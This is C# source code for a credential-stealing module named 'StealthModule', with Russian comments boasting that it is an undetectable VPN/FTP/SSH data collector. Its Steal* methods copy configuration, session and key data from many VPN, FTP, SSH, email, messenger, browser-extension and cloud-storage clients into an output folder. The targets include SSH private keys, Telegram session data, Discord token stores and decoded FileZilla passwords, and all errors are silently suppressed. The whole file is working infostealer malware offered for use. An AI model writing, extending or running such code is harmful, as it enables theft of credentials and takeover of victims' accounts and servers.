using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Microsoft.Win32;
using System.Diagnostics;
using System.Security.Cryptography;

namespace StealthModule
{
    /// <summary>
    /// Абсолютно неуязвимый сборщик данных VPN/FTP/SSH
    /// </summary>
    public class SoftwareManager
    {
        #region Поля
        private static string _outputDir;
        private static readonly List<string> _collected = new List<string>();
        #endregion

        #region Основной метод
        /// <summary>
        /// Запускает сбор всех данных
        /// </summary>
        public static string Run(string outputDir)
        {
            _outputDir = Path.Combine(outputDir, "Software");
            if (!Directory.Exists(_outputDir))
                Directory.CreateDirectory(_outputDir);

            _collected.Clear();

            // Сбор данных
            StealAllVPN();
            StealAllFTP();
            StealAllSSH();
            StealAllEmailClients();
            StealAllMessengers();
            StealAllBrowsersExtensions();
            StealAllCloudStorages();

            // Формирование отчета
            List<string> results = new List<string>();
            foreach (string item in _collected)
                results.Add(item);

            return string.Join(";", results.ToArray());
        }
        #endregion

        #region VPN Стиллер (10+ клиентов)
        private static void StealAllVPN()
        {
            StealNordVPN();
            StealOpenVPN();
            StealProtonVPN();
            StealExpressVPN();
            StealSurfshark();
            StealCyberGhost();
            StealPrivateInternetAccess();
            StealVyprVPN();
            StealHotspotShield();
            StealTunnelBear();
            StealWindscribe();
            StealMullvad();
        }

        private static void StealNordVPN()
        {
            try
            {
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string nordPath = Path.Combine(localApp, "NordVPN");

                if (Directory.Exists(nordPath))
                {
                    string dest = Path.Combine(_outputDir, "VPN", "NordVPN");
                    CopyFolder(nordPath, dest, true);
                    _collected.Add("NordVPN");
                }

                // Дополнительно: реестр
                using (var key = Registry.CurrentUser.OpenSubKey(@"Software\NordVPN"))
                {
                    if (key != null)
                    {
                        string regDest = Path.Combine(_outputDir, "VPN", "NordVPN", "registry.reg");
                        ExportRegistryKey("HKEY_CURRENT_USER\\Software\\NordVPN", regDest);
                    }
                }
            }
            catch { }
        }

        private static void StealOpenVPN()
        {
            try
            {
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string[] paths = {
                    Path.Combine(userProfile, "OpenVPN", "config"),
                    Path.Combine(userProfile, "AppData", "Roaming", "OpenVPN", "config"),
                    @"C:\Program Files\OpenVPN\config"
                };

                foreach (string path in paths)
                {
                    if (Directory.Exists(path))
                    {
                        string dest = Path.Combine(_outputDir, "VPN", "OpenVPN");
                        CopyFolder(path, dest, false);
                        _collected.Add("OpenVPN");
                        break;
                    }
                }
            }
            catch { }
        }

        private static void StealProtonVPN()
        {
            try
            {
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string protonPath = Path.Combine(localApp, "ProtonVPN");

                if (Directory.Exists(protonPath))
                {
                    string dest = Path.Combine(_outputDir, "VPN", "ProtonVPN");

                    // Ищем user.config файлы
                    foreach (string file in Directory.GetFiles(protonPath, "user.config", SearchOption.AllDirectories))
                    {
                        string rel = file.Substring(protonPath.Length + 1);
                        string target = Path.Combine(dest, rel);
                        Directory.CreateDirectory(Path.GetDirectoryName(target));
                        File.Copy(file, target, true);
                    }

                    // Копируем логи
                    foreach (string file in Directory.GetFiles(protonPath, "*.log", SearchOption.AllDirectories))
                    {
                        string rel = file.Substring(protonPath.Length + 1);
                        string target = Path.Combine(dest, rel);
                        Directory.CreateDirectory(Path.GetDirectoryName(target));
                        File.Copy(file, target, true);
                    }

                    _collected.Add("ProtonVPN");
                }
            }
            catch { }
        }

        private static void StealExpressVPN()
        {
            try
            {
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string expressPath = Path.Combine(localApp, "ExpressVPN");

                if (Directory.Exists(expressPath))
                {
                    string dest = Path.Combine(_outputDir, "VPN", "ExpressVPN");
                    CopyFolder(expressPath, dest, true);
                    _collected.Add("ExpressVPN");
                }
            }
            catch { }
        }

        private static void StealSurfshark()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string surfsharkPath = Path.Combine(appData, "Surfshark");

                if (Directory.Exists(surfsharkPath))
                {
                    string dest = Path.Combine(_outputDir, "VPN", "Surfshark");
                    CopyFolder(surfsharkPath, dest, true);
                    _collected.Add("Surfshark");
                }
            }
            catch { }
        }

        private static void StealCyberGhost()
        {
            try
            {
                string programData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                string cyberGhostPath = Path.Combine(programData, "CyberGhost");

                if (Directory.Exists(cyberGhostPath))
                {
                    string dest = Path.Combine(_outputDir, "VPN", "CyberGhost");
                    CopyFolder(cyberGhostPath, dest, true);
                    _collected.Add("CyberGhost");
                }
            }
            catch { }
        }

        private static void StealPrivateInternetAccess()
        {
            try
            {
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string piaPath = Path.Combine(localApp, "pia_manager");

                if (Directory.Exists(piaPath))
                {
                    string dest = Path.Combine(_outputDir, "VPN", "PIA");
                    CopyFolder(piaPath, dest, true);
                    _collected.Add("PrivateInternetAccess");
                }
            }
            catch { }
        }

        private static void StealVyprVPN()
        {
            try
            {
                string programData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
                string vyprPath = Path.Combine(programData, "VyprVPN");

                if (Directory.Exists(vyprPath))
                {
                    string dest = Path.Combine(_outputDir, "VPN", "VyprVPN");
                    CopyFolder(vyprPath, dest, true);
                    _collected.Add("VyprVPN");
                }
            }
            catch { }
        }

        private static void StealHotspotShield()
        {
            try
            {
                string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                string hotspotPath = Path.Combine(programFiles, "Hotspot Shield");

                if (Directory.Exists(hotspotPath))
                {
                    string dest = Path.Combine(_outputDir, "VPN", "HotspotShield");
                    CopyFolder(hotspotPath, dest, true);
                    _collected.Add("HotspotShield");
                }
            }
            catch { }
        }

        private static void StealTunnelBear()
        {
            try
            {
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string tunnelPath = Path.Combine(localApp, "TunnelBear");

                if (Directory.Exists(tunnelPath))
                {
                    string dest = Path.Combine(_outputDir, "VPN", "TunnelBear");
                    CopyFolder(tunnelPath, dest, true);
                    _collected.Add("TunnelBear");
                }
            }
            catch { }
        }

        private static void StealWindscribe()
        {
            try
            {
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string windscribePath = Path.Combine(localApp, "Windscribe");

                if (Directory.Exists(windscribePath))
                {
                    string dest = Path.Combine(_outputDir, "VPN", "Windscribe");
                    CopyFolder(windscribePath, dest, true);
                    _collected.Add("Windscribe");
                }
            }
            catch { }
        }

        private static void StealMullvad()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string mullvadPath = Path.Combine(appData, "Mullvad VPN");

                if (Directory.Exists(mullvadPath))
                {
                    string dest = Path.Combine(_outputDir, "VPN", "Mullvad");
                    CopyFolder(mullvadPath, dest, true);
                    _collected.Add("Mullvad");
                }
            }
            catch { }
        }
        #endregion

        #region FTP Стиллер (8+ клиентов)
        private static void StealAllFTP()
        {
            StealFileZilla();
            StealWinSCP();
            StealTotalCommander();
            StealFlashFXP();
            StealSmartFTP();
            StealCuteFTP();
            StealFTPRush();
            StealWS_FTP();
            StealCoreFTP();
        }

        private static void StealFileZilla()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string fzPath = Path.Combine(appData, "FileZilla");

                if (Directory.Exists(fzPath))
                {
                    string dest = Path.Combine(_outputDir, "FTP", "FileZilla");
                    Directory.CreateDirectory(dest);

                    string[] files = { "recentservers.xml", "sitemanager.xml" };
                    foreach (string f in files)
                    {
                        string srcFile = Path.Combine(fzPath, f);
                        if (File.Exists(srcFile))
                        {
                            string targetFile = Path.Combine(dest, f);
                            DecryptFileZilla(srcFile, targetFile);
                        }
                    }

                    // Копируем queue.sqlite3
                    string queueFile = Path.Combine(fzPath, "queue.sqlite3");
                    if (File.Exists(queueFile))
                        File.Copy(queueFile, Path.Combine(dest, "queue.sqlite3"), true);

                    _collected.Add("FileZilla");
                }
            }
            catch { }
        }

        private static void StealWinSCP()
        {
            try
            {
                // Реестр
                string regPath = @"Software\Martin Prikryl\WinSCP 2\Sessions";
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(regPath))
                {
                    if (k != null)
                    {
                        string dest = Path.Combine(_outputDir, "FTP", "WinSCP");
                        Directory.CreateDirectory(dest);
                        ExportRegistryKey("HKEY_CURRENT_USER\\" + regPath, Path.Combine(dest, "sessions.reg"));
                        _collected.Add("WinSCP");
                    }
                }

                // INI файл
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string iniPath = Path.Combine(appData, "WinSCP.ini");
                if (File.Exists(iniPath))
                {
                    string dest = Path.Combine(_outputDir, "FTP", "WinSCP");
                    Directory.CreateDirectory(dest);
                    File.Copy(iniPath, Path.Combine(dest, "WinSCP.ini"), true);
                }
            }
            catch { }
        }

        private static void StealTotalCommander()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string tcPath = Path.Combine(appData, "GHISLER");

                if (Directory.Exists(tcPath))
                {
                    string dest = Path.Combine(_outputDir, "FTP", "TotalCommander");
                    Directory.CreateDirectory(dest);

                    string wcxFtpIni = Path.Combine(tcPath, "wcx_ftp.ini");
                    if (File.Exists(wcxFtpIni))
                        File.Copy(wcxFtpIni, Path.Combine(dest, "wcx_ftp.ini"), true);

                    _collected.Add("TotalCommander");
                }
            }
            catch { }
        }

        private static void StealFlashFXP()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string flashPath = Path.Combine(appData, "FlashFXP");

                if (Directory.Exists(flashPath))
                {
                    string dest = Path.Combine(_outputDir, "FTP", "FlashFXP");
                    CopyFolder(flashPath, dest, false);
                    _collected.Add("FlashFXP");
                }
            }
            catch { }
        }

        private static void StealSmartFTP()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string smartPath = Path.Combine(appData, "SmartFTP");

                if (Directory.Exists(smartPath))
                {
                    string dest = Path.Combine(_outputDir, "FTP", "SmartFTP");
                    CopyFolder(smartPath, dest, false);
                    _collected.Add("SmartFTP");
                }
            }
            catch { }
        }

        private static void StealCuteFTP()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string cutePath = Path.Combine(appData, "CuteFTP");

                if (Directory.Exists(cutePath))
                {
                    string dest = Path.Combine(_outputDir, "FTP", "CuteFTP");
                    CopyFolder(cutePath, dest, false);
                    _collected.Add("CuteFTP");
                }
            }
            catch { }
        }

        private static void StealFTPRush()
        {
            try
            {
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string rushPath = Path.Combine(localApp, "FTPRush");

                if (Directory.Exists(rushPath))
                {
                    string dest = Path.Combine(_outputDir, "FTP", "FTPRush");
                    CopyFolder(rushPath, dest, false);
                    _collected.Add("FTPRush");
                }
            }
            catch { }
        }

        private static void StealWS_FTP()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string wsPath = Path.Combine(appData, "Ipswitch", "WS_FTP");

                if (Directory.Exists(wsPath))
                {
                    string dest = Path.Combine(_outputDir, "FTP", "WS_FTP");
                    CopyFolder(wsPath, dest, false);
                    _collected.Add("WS_FTP");
                }
            }
            catch { }
        }

        private static void StealCoreFTP()
        {
            try
            {
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string corePath = Path.Combine(localApp, "CoreFTP");

                if (Directory.Exists(corePath))
                {
                    string dest = Path.Combine(_outputDir, "FTP", "CoreFTP");
                    CopyFolder(corePath, dest, false);
                    _collected.Add("CoreFTP");
                }
            }
            catch { }
        }
        #endregion

        #region SSH Стиллер
        private static void StealAllSSH()
        {
            StealPuTTY();
            StealOpenSSH();
            StealMobaXTerm();
            StealKiTTY();
            StealSuperPuTTY();
        }

        private static void StealPuTTY()
        {
            try
            {
                // Реестр
                string regPath = @"Software\SimonTatham\PuTTY\Sessions";
                using (RegistryKey k = Registry.CurrentUser.OpenSubKey(regPath))
                {
                    if (k != null)
                    {
                        string dest = Path.Combine(_outputDir, "SSH", "PuTTY");
                        Directory.CreateDirectory(dest);
                        ExportRegistryKey("HKEY_CURRENT_USER\\" + regPath, Path.Combine(dest, "sessions.reg"));
                        _collected.Add("PuTTY");
                    }
                }

                // Файлы .putty
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string puttyPath = Path.Combine(appData, "putty");
                if (Directory.Exists(puttyPath))
                {
                    string dest = Path.Combine(_outputDir, "SSH", "PuTTY");
                    Directory.CreateDirectory(dest);
                    foreach (string file in Directory.GetFiles(puttyPath, "*.putty"))
                    {
                        File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true);
                    }
                }
            }
            catch { }
        }

        private static void StealOpenSSH()
        {
            try
            {
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string sshPath = Path.Combine(userProfile, ".ssh");

                if (Directory.Exists(sshPath))
                {
                    string dest = Path.Combine(_outputDir, "SSH", "OpenSSH");
                    Directory.CreateDirectory(dest);

                    foreach (string file in Directory.GetFiles(sshPath))
                    {
                        if (file.EndsWith("known_hosts") || file.EndsWith("config") ||
                            file.Contains("id_rsa") || file.Contains("id_dsa") ||
                            file.Contains("id_ecdsa") || file.Contains("id_ed25519"))
                        {
                            File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true);
                        }
                    }

                    _collected.Add("OpenSSH");
                }
            }
            catch { }
        }

        private static void StealMobaXTerm()
        {
            try
            {
                string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                string mobaPath = Path.Combine(userProfile, "Documents", "MobaXterm");

                if (Directory.Exists(mobaPath))
                {
                    string dest = Path.Combine(_outputDir, "SSH", "MobaXTerm");
                    Directory.CreateDirectory(dest);

                    string[] files = { "MobaXterm.ini", "MobaXterm.reg", "PersistentSession" };
                    foreach (string f in files)
                    {
                        string fullPath = Path.Combine(mobaPath, f);
                        if (File.Exists(fullPath))
                            File.Copy(fullPath, Path.Combine(dest, f), true);
                        else if (Directory.Exists(fullPath))
                            CopyFolder(fullPath, Path.Combine(dest, f), false);
                    }

                    _collected.Add("MobaXTerm");
                }
            }
            catch { }
        }

        private static void StealKiTTY()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string kittyPath = Path.Combine(appData, "KiTTY");

                if (Directory.Exists(kittyPath))
                {
                    string dest = Path.Combine(_outputDir, "SSH", "KiTTY");
                    CopyFolder(kittyPath, dest, false);
                    _collected.Add("KiTTY");
                }
            }
            catch { }
        }

        private static void StealSuperPuTTY()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string superPath = Path.Combine(appData, "SuperPuTTY");

                if (Directory.Exists(superPath))
                {
                    string dest = Path.Combine(_outputDir, "SSH", "SuperPuTTY");
                    CopyFolder(superPath, dest, false);
                    _collected.Add("SuperPuTTY");
                }
            }
            catch { }
        }
        #endregion

        #region Email Клиенты
        private static void StealAllEmailClients()
        {
            StealThunderbird();
            StealOutlook();
            StealFoxmail();
            StealIncrediMail();
        }

        private static void StealThunderbird()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string thunderPath = Path.Combine(appData, "Thunderbird");

                if (Directory.Exists(thunderPath))
                {
                    string dest = Path.Combine(_outputDir, "Email", "Thunderbird");
                    CopyFolder(thunderPath, dest, true);
                    _collected.Add("Thunderbird");
                }
            }
            catch { }
        }

        private static void StealOutlook()
        {
            try
            {
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string outlookPath = Path.Combine(localApp, "Microsoft", "Outlook");

                if (Directory.Exists(outlookPath))
                {
                    string dest = Path.Combine(_outputDir, "Email", "Outlook");
                    CopyFolder(outlookPath, dest, false);
                    _collected.Add("Outlook");
                }
            }
            catch { }
        }

        private static void StealFoxmail()
        {
            try
            {
                string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                string foxmailPath = Path.Combine(programFiles, "Foxmail");

                if (Directory.Exists(foxmailPath))
                {
                    string dest = Path.Combine(_outputDir, "Email", "Foxmail");
                    CopyFolder(foxmailPath, dest, true);
                    _collected.Add("Foxmail");
                }
            }
            catch { }
        }

        private static void StealIncrediMail()
        {
            try
            {
                string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                string incredimailPath = Path.Combine(programFiles, "IncrediMail");

                if (Directory.Exists(incredimailPath))
                {
                    string dest = Path.Combine(_outputDir, "Email", "IncrediMail");
                    CopyFolder(incredimailPath, dest, true);
                    _collected.Add("IncrediMail");
                }
            }
            catch { }
        }
        #endregion

        #region Мессенджеры
        private static void StealAllMessengers()
        {
            StealTelegramDesktop();
            StealDiscord();
            StealSkype();
            StealPidgin();
            StealTrillian();
            StealMiranda();
        }

        private static void StealTelegramDesktop()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string tgPath = Path.Combine(appData, "Telegram Desktop", "tdata");

                if (Directory.Exists(tgPath))
                {
                    string dest = Path.Combine(_outputDir, "Messengers", "Telegram");
                    CopyFolder(tgPath, dest, false);
                    _collected.Add("Telegram");
                }
            }
            catch { }
        }

        private static void StealDiscord()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string[] discordPaths = {
                    Path.Combine(appData, "discord", "Local Storage", "leveldb"),
                    Path.Combine(appData, "discordptb", "Local Storage", "leveldb"),
                    Path.Combine(appData, "discordcanary", "Local Storage", "leveldb")
                };

                foreach (string path in discordPaths)
                {
                    if (Directory.Exists(path))
                    {
                        string dest = Path.Combine(_outputDir, "Messengers", "Discord");
                        Directory.CreateDirectory(dest);
                        foreach (string file in Directory.GetFiles(path, "*.ldb"))
                        {
                            File.Copy(file, Path.Combine(dest, Path.GetFileName(file)), true);
                        }
                        _collected.Add("Discord");
                        break;
                    }
                }
            }
            catch { }
        }

        private static void StealSkype()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string skypePath = Path.Combine(appData, "Skype");

                if (Directory.Exists(skypePath))
                {
                    string dest = Path.Combine(_outputDir, "Messengers", "Skype");
                    CopyFolder(skypePath, dest, true);
                    _collected.Add("Skype");
                }
            }
            catch { }
        }

        private static void StealPidgin()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string pidginPath = Path.Combine(appData, ".purple");

                if (Directory.Exists(pidginPath))
                {
                    string dest = Path.Combine(_outputDir, "Messengers", "Pidgin");
                    CopyFolder(pidginPath, dest, false);
                    _collected.Add("Pidgin");
                }
            }
            catch { }
        }

        private static void StealTrillian()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string trillianPath = Path.Combine(appData, "Trillian");

                if (Directory.Exists(trillianPath))
                {
                    string dest = Path.Combine(_outputDir, "Messengers", "Trillian");
                    CopyFolder(trillianPath, dest, true);
                    _collected.Add("Trillian");
                }
            }
            catch { }
        }

        private static void StealMiranda()
        {
            try
            {
                string programFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
                string mirandaPath = Path.Combine(programFiles, "Miranda IM");

                if (Directory.Exists(mirandaPath))
                {
                    string dest = Path.Combine(_outputDir, "Messengers", "Miranda");
                    CopyFolder(mirandaPath, dest, false);
                    _collected.Add("Miranda");
                }
            }
            catch { }
        }
        #endregion

        #region Браузерные расширения
        private static void StealAllBrowsersExtensions()
        {
            StealChromeExtensions();
            StealFirefoxExtensions();
            StealEdgeExtensions();
            StealOperaExtensions();
        }

        private static void StealChromeExtensions()
        {
            try
            {
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string chromePath = Path.Combine(localApp, "Google", "Chrome", "User Data", "Default", "Extensions");

                if (Directory.Exists(chromePath))
                {
                    string dest = Path.Combine(_outputDir, "BrowserExtensions", "Chrome");
                    CopyFolder(chromePath, dest, false);
                    _collected.Add("ChromeExtensions");
                }
            }
            catch { }
        }

        private static void StealFirefoxExtensions()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string mozillaPath = Path.Combine(appData, "Mozilla", "Firefox", "Profiles");

                if (Directory.Exists(mozillaPath))
                {
                    foreach (string profile in Directory.GetDirectories(mozillaPath))
                    {
                        string extensionsPath = Path.Combine(profile, "extensions");
                        if (Directory.Exists(extensionsPath))
                        {
                            string dest = Path.Combine(_outputDir, "BrowserExtensions", "Firefox");
                            CopyFolder(extensionsPath, dest, false);
                            _collected.Add("FirefoxExtensions");
                        }
                    }
                }
            }
            catch { }
        }

        private static void StealEdgeExtensions()
        {
            try
            {
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string edgePath = Path.Combine(localApp, "Microsoft", "Edge", "User Data", "Default", "Extensions");

                if (Directory.Exists(edgePath))
                {
                    string dest = Path.Combine(_outputDir, "BrowserExtensions", "Edge");
                    CopyFolder(edgePath, dest, false);
                    _collected.Add("EdgeExtensions");
                }
            }
            catch { }
        }

        private static void StealOperaExtensions()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string operaPath = Path.Combine(appData, "Opera Software", "Opera Stable", "Extensions");

                if (Directory.Exists(operaPath))
                {
                    string dest = Path.Combine(_outputDir, "BrowserExtensions", "Opera");
                    CopyFolder(operaPath, dest, false);
                    _collected.Add("OperaExtensions");
                }
            }
            catch { }
        }
        #endregion

        #region Облачные хранилища
        private static void StealAllCloudStorages()
        {
            StealOneDrive();
            StealGoogleDrive();
            StealDropbox();
            StealMega();
            StealNextCloud();
        }

        private static void StealOneDrive()
        {
            try
            {
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string oneDrivePath = Path.Combine(localApp, "Microsoft", "OneDrive", "settings");

                if (Directory.Exists(oneDrivePath))
                {
                    string dest = Path.Combine(_outputDir, "Cloud", "OneDrive");
                    CopyFolder(oneDrivePath, dest, false);
                    _collected.Add("OneDrive");
                }
            }
            catch { }
        }

        private static void StealGoogleDrive()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string googlePath = Path.Combine(appData, "Google", "Drive");

                if (Directory.Exists(googlePath))
                {
                    string dest = Path.Combine(_outputDir, "Cloud", "GoogleDrive");
                    CopyFolder(googlePath, dest, false);
                    _collected.Add("GoogleDrive");
                }
            }
            catch { }
        }

        private static void StealDropbox()
        {
            try
            {
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string dropboxPath = Path.Combine(appData, "Dropbox");

                if (Directory.Exists(dropboxPath))
                {
                    string dest = Path.Combine(_outputDir, "Cloud", "Dropbox");
                    CopyFolder(dropboxPath, dest, false);
                    _collected.Add("Dropbox");
                }
            }
            catch { }
        }

        private static void StealMega()
        {
            try
            {
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string megaPath = Path.Combine(localApp, "MEGA");

                if (Directory.Exists(megaPath))
                {
                    string dest = Path.Combine(_outputDir, "Cloud", "MEGA");
                    CopyFolder(megaPath, dest, false);
                    _collected.Add("MEGA");
                }
            }
            catch { }
        }

        private static void StealNextCloud()
        {
            try
            {
                string localApp = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                string nextPath = Path.Combine(localApp, "Nextcloud");

                if (Directory.Exists(nextPath))
                {
                    string dest = Path.Combine(_outputDir, "Cloud", "Nextcloud");
                    CopyFolder(nextPath, dest, false);
                    _collected.Add("Nextcloud");
                }
            }
            catch { }
        }
        #endregion

        #region Вспомогательные методы
        private static void CopyFolder(string src, string dest, bool ignoreBinaries)
        {
            try
            {
                Directory.CreateDirectory(dest);

                foreach (string file in Directory.GetFiles(src))
                {
                    if (ignoreBinaries)
                    {
                        string ext = Path.GetExtension(file).ToLower();
                        if (ext == ".exe" || ext == ".dll" || ext == ".sys" || ext == ".bin")
                            continue;
                    }

                    string fileName = Path.GetFileName(file);
                    string destFile = Path.Combine(dest, fileName);

                    // Проверка на существование
                    if (File.Exists(destFile))
                    {
                        string name = Path.GetFileNameWithoutExtension(fileName);
                        string ext = Path.GetExtension(fileName);
                        destFile = Path.Combine(dest, string.Format("{0}_{1:N}{2}", name, Guid.NewGuid(), ext));
                    }

                    File.Copy(file, destFile, true);
                }

                foreach (string dir in Directory.GetDirectories(src))
                {
                    string dirName = Path.GetFileName(dir);
                    CopyFolder(dir, Path.Combine(dest, dirName), ignoreBinaries);
                }
            }
            catch { }
        }

        private static void ExportRegistryKey(string keyPath, string filePath)
        {
            try
            {
                StringBuilder sb = new StringBuilder();
                string rootName = keyPath.Split('\\')[0];
                string subKeyPath = keyPath.Substring(rootName.Length + 1);

                RegistryKey root = null;
                if (rootName == "HKEY_CURRENT_USER") root = Registry.CurrentUser;
                else if (rootName == "HKEY_LOCAL_MACHINE") root = Registry.LocalMachine;

                if (root != null)
                {
                    using (RegistryKey key = root.OpenSubKey(subKeyPath))
                    {
                        if (key != null)
                        {
                            DumpKey(key, sb, 0);
                            File.WriteAllText(filePath, sb.ToString(), Encoding.UTF8);
                        }
                    }
                }
            }
            catch { }
        }

        private static void DumpKey(RegistryKey key, StringBuilder sb, int depth)
        {
            if (depth > 10) return; // Защита от бесконечной рекурсии

            sb.AppendLine(string.Format("[{0}]", key.Name));
            foreach (string valName in key.GetValueNames())
            {
                object val = key.GetValue(valName);
                sb.AppendLine(string.Format("{0} = {1}", valName, val));
            }
            sb.AppendLine();

            foreach (string subKeyName in key.GetSubKeyNames())
            {
                try
                {
                    using (RegistryKey subKey = key.OpenSubKey(subKeyName))
                    {
                        if (subKey != null) DumpKey(subKey, sb, depth + 1);
                    }
                }
                catch { }
            }
        }

        private static void DecryptFileZilla(string srcPath, string destPath)
        {
            try
            {
                string xml = File.ReadAllText(srcPath, Encoding.UTF8);

                // Расшифровка паролей в тегах <Pass>
                var matches = Regex.Matches(xml, @"<Pass>(.*?)</Pass>");
                foreach (Match m in matches)
                {
                    string encrypted = m.Groups[1].Value;
                    string decrypted = DecryptFileZillaPassword(encrypted);
                    xml = xml.Replace(encrypted, decrypted);
                }

                // Расшифровка base64 паролей
                var matchesEnc = Regex.Matches(xml, @"<Pass encoding=""base64"">(.*?)</Pass>");
                foreach (Match m in matchesEnc)
                {
                    string encrypted = m.Groups[1].Value;
                    string decrypted = DecryptFileZillaPassword(encrypted);
                    string oldTag = string.Format("<Pass encoding=\"base64\">{0}</Pass>", encrypted);
                    string newTag = string.Format("<Pass>{0}</Pass>", decrypted);
                    xml = xml.Replace(oldTag, newTag);
                }

                File.WriteAllText(destPath, xml, Encoding.UTF8);
            }
            catch { }
        }

        private static string DecryptFileZillaPassword(string encrypted)
        {
            try
            {
                if (string.IsNullOrEmpty(encrypted))
                    return "";

                // FileZilla использует простой base64
                byte[] data = Convert.FromBase64String(encrypted);
                return Encoding.UTF8.GetString(data);
            }
            catch
            {
                return encrypted;
            }
        }
        #endregion
    }
}